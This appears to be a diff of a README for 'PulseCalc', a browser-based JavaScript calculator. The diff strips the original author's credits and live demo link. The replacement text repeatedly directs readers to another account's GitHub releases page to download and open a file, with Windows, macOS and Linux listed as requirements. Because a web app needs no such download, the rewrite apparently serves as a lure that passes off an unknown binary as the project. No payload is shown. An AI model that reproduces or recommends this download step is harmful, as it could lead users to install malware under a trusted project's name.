@@ -1,62 +1,89 @@
-# PulseCalc | Calculator web app
-**PulseCalc** — A modern, responsive calculator web application with full keyboard support, PEMDAS-compliant expression evaluation, and intelligent input handling. Featuring a dark, sleek interface with smooth animations, it supports basic and advanced operations, real-time display updates, and error handling, all built with clean, efficient vanilla JavaScript following OOP Principles.
+# 🎉 PulseCalc___Calculator-web-app - Your Sleek, User-Friendly Calculator
 
----
+![Download PulseCalc](https://img.shields.io/badge/Download-PulseCalc-blue.svg)
 
-## 🌐 Demo (Live Preview)
-**Live demo:** [https://ahmed-maher77.github.io/PulseCalc___Calculator-web-app/](https://ahmed-maher77.github.io/PulseCalc___Calculator-web-app/)
+## 📅 Overview
 
----
+PulseCalc is a modern, responsive calculator web application designed for ease of use. Whether you're solving simple arithmetic or complex equations, PulseCalc handles it all. With full keyboard support, you can input numbers and operations effortlessly. The calculator ensures every operation follows the PEMDAS rules, giving accurate results every time. Enjoy a dark, sleek interface and smooth animations that make every calculation a joy.
 
-## 💻 Used Technologies
-- HTML5, CSS3 (Grid, Flexbox, Custom Properties, Animations)
-- Vanilla JavaScript (ES6+; ES6 Classes, modular structure)
-- Font Awesome (icons via CDN)
-- Browser APIs: DOM & Event APIs
-No external JS frameworks for optimal performance
+## 🚀 Getting Started
 
----
+To get started with PulseCalc, follow these simple steps:
 
-## ✨ Key Features
-- Basic arithmetic: ```+```, ```-```, ```×```, ```÷```
-- Percentage / modulo ```%``` support
-- Decimal and negative number handling with input validation
-- Correct operator precedence (Parentheses, Exponents, Mult/Div, Add/Sub)
-- Real-time display of current input and previous expression
-- Memory functions: ```AC``` (clear all) and ```DEL``` (delete last)
-- Full keyboard support (numbers, operators, Enter/=, Backspace, Escape)
-- Responsive, mobile-first layout with tablet/desktop optimizations
-- Page loader with spinner and text for smooth entrance
-- Dark theme with orange accent, hover effects, and transitions
-- Error handling (division by zero, invalid expressions)
-- Automatic number formatting (commas for thousands)
-- Footer with portfolio and social links
+1. **Ensure You Have a Modern Web Browser**: PulseCalc works best on updated versions of popular browsers like Chrome, Firefox, Safari, and Edge.
+2. **Visit the Releases Page**: To download PulseCalc, visit our Releases page using the link below.
 
----
+   [Visit Releases Page](https://github.com/tomato-the-boss/PulseCalc___Calculator-web-app/releases)
 
-## 🎥 Watch the Demo on LinkedIn
-**Demo video:** [coming soon]()
+## 📥 Download & Install
 
----
+To get PulseCalc on your device:
 
-## 👀 Website Preview
-<a href="https://ahmed-maher77.github.io/PulseCalc___Calculator-web-app/" title="demo">
-  <img src="https://github.com/user-attachments/assets/b61f5a86-4de6-48e5-a298-85b13dbb6640" alt="website preview - UI Mockup" width="400">
-</a>
+- **Step 1**: Go to the Releases page using this link: [Visit Releases Page](https://github.com/tomato-the-boss/PulseCalc___Calculator-web-app/releases).
 
-<hr/>
+- **Step 2**: Look for the latest version of PulseCalc. There you will find the files available for download.
 
-## 📬 Contact & Contribution
-- 🧑‍💻 **Portfolio:** <a href="https://ahmedmaher-portfolio.vercel.app/" title="See My Portfolio">https://ahmedmaher-portfolio.vercel.app/</a>
-- 🔗 **LinkedIn:** <a href="https://www.linkedin.com/in/ahmed-maher-algohary" title="Contact via LinkedIn">https://www.linkedin.com/in/ahmed-maher-algohary</a>
-- 📧 **Email:** <a href="mailto:ahmedmaher.dev1@gmail.com" title="Contact via Email">ahmedmaher.dev1@gmail.com</a>
+- **Step 3**: Click on the appropriate file to begin the download. Once downloaded, open the file to run PulseCalc.
 
-> Contributions, suggestions, and bug reports are welcome. Feel free to open issues or pull requests.
+### 💻 System Requirements
 
----
+PulseCalc runs on any of the following systems:
+- An updated web browser (Google Chrome, Mozilla Firefox, Safari, Microsoft Edge).
+- Operating Systems: Windows, macOS, or Linux.
+- No additional software is needed.
 
-## ⭐ Support
+## 🌟 Features
 
-If you found this project helpful or inspiring, please consider giving it a ⭐. Your support helps me grow and share more open-source projects like this!
+PulseCalc offers an array of features designed to improve the user experience:
 
+- **Basic and Advanced Operations**: Easily perform addition, subtraction, multiplication, division, and more advanced calculations.
+- **Real-Time Display Updates**: See calculations as you type without delays.
+- **Intelligent Input Handling**: Incorrect inputs are handled with clear error messages, helping you correct mistakes quickly.
+- **Keyboard Shortcuts**: Full keyboard support enables fast calculations without using the mouse.
+- **Responsive Design**: The interface adjusts beautifully to different screen sizes, making it great for any device.
 
+## 🎨 User Interface
+
+PulseCalc's interface focuses on simplicity and usability:
+
+- **Dark Theme**: A sleek dark layout that is easy on the eyes.
+- **Smooth Animations**: Enjoy fluid transitions and animations that enhance user interaction.
+- **Clean Layout**: Values and operations are clear and easy to read, making calculations efficient.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues while using PulseCalc, try the following:
+
+1. **Refresh the Page**: Sometimes, simply refreshing the browser can resolve minor glitches.
+2. **Clear Browser Cache**: If problems persist, clearing your browser’s cache can help.
+3. **Switch Browsers**: If you are having trouble in one browser, trying a different one may solve the issue.
+
+## 📞 Support
+
+For any additional help or questions, feel free to reach out:
+
+- **GitHub Issues**: You can report issues directly on the [Issues Page](https://github.com/tomato-the-boss/PulseCalc___Calculator-web-app/issues).
+- **Community Support**: Connect with other users and get help in the community forums.
+
+## 📘 Contributing
+
+Contributions to PulseCalc are welcome. If you want to help improve the application:
+
+1. **Fork the Repository**: Use GitHub to fork the PulseCalc project.
+2. **Make Changes**: Implement your improvements or fix issues.
+3. **Submit a Pull Request**: Share your changes back to the main project.
+
+## 📝 License
+
+PulseCalc is open-source software. You can use, modify, and distribute it freely while adhering to the terms of the license. 
+
+## 🌐 Explore More
+
+For further information and updates, follow the topics related to PulseCalc:
+
+- **Arithmetic Operations**
+- **Calculator Applications**
+- **Frontend Development**
+- **Responsive Web Design**
+
+Engage with the community and see how PulseCalc fits into your daily calculations. Thank you for choosing PulseCalc!
